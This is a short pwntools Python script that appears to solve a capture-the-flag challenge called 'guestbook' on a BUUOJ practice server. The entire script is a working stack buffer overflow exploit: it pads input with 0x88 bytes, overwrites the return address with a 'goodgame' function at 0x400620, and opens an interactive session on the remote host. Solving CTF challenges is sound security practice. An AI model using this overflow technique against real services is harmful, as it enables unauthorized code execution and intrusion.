from pwn import*
elf=ELF('./guestbook')
#p=process('./guestbook')
p=remote('node4.buuoj.cn',25041)
goodgame=0x400620
payload=b'a'*0x88+p64(goodgame)
p.recvuntil(b'Input your message:\n')
p.sendline(payload)

p.interactive()